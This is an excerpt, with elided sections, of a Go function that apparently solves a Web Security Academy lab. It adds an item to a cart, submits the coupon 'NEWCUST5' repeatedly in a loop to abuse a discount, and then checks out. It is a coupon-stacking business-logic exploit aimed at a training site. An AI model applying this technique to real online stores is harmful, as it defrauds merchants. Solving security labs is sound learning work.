...
func solve() error {
	baseUrl := "https://0a49009e048d3b00c89b1677008e008f.web-security-academy.net"
	cartUrl := baseUrl + "/cart"
	couponUrl := baseUrl + "/cart/coupon"
	...
	values.Set("productId", "1")
	values.Set("redir", "PRODUCT")
	values.Set("quantity", "1")

	_, body, err = postForm(client, cartUrl, nil, values)
	if err != nil {
		return err
	}

	_, body, err = get(client, cartUrl, nil)
	if err != nil {
		return err
	}
	...
	for i:=0; i<5; i++ {
		...
		values.Set("coupon", "NEWCUST5")
		_, body, err = postForm(client, couponUrl, nil, values)
		if err != nil {
			return err
		}
	...
	values = make(url.Values)
	values.Set("csrf", csrfToken)
	_, body, err = postForm(client, checkoutUrl, nil, values)
	if err != nil {
		return err
	}
	return nil
